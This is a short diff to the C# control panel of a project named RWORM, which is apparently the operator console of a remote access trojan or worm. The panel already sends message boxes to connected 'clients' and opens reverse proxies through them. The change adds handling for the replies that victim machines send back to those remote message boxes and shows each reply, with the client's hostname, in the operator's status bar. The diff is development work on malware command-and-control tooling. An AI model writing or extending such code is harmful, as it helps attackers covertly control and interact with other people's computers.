@@ -556,10 +556,42 @@ namespace RWORM.GUI.ViewModels
             {
                 foreach (var client in targets)
                 {
-                    _ = _server.ShowRemoteMessageBox(client.Guid, dlg.MsgTitle, dlg.MsgBody, dlg.ButtonsVal, dlg.IconVal);
+                    var guid = client.Guid;
+                    _ = _server.ShowRemoteMessageBox(guid, dlg.MsgTitle, dlg.MsgBody, dlg.ButtonsVal, dlg.IconVal,
+                        resp => OnMessageBoxResult(guid, resp));
                 }
                 StatusMessage = $"MessageBox sent to {targets.Count} client(s)";
             }
+        }
+
+        // 0xD9 MSGBOX_RESP — {"result":N,"button":"X"}
+        private void OnMessageBoxResult(string guid, byte[] resp)
+        {
+            string host = guid;
+            string text;
+            try
+            {
+                string raw = System.Text.Encoding.UTF8.GetString(resp ?? Array.Empty<byte>());
+                using (var doc = System.Text.Json.JsonDocument.Parse(raw))
+                {
+                    var root = doc.RootElement;
+                    string button = root.TryGetProperty("button", out var b) ? (b.GetString() ?? "") : "";
+                    text = string.IsNullOrEmpty(button) ? raw : button;
+                }
+            }
+            catch
+            {
+                text = "unparsable reply";
+            }
+
+            var dispatcher = System.Windows.Application.Current?.Dispatcher;
+            if (dispatcher == null) return;
+            dispatcher.BeginInvoke(new Action(() =>
+            {
+                var client = Clients.FirstOrDefault(x => x.Guid == guid);
+                host = client?.Hostname ?? guid;
+                StatusMessage = $"MessageBox reply from {host}: {text}";
+            }));
         }
 
         private void OpenReverseProxy(ClientModel? c)
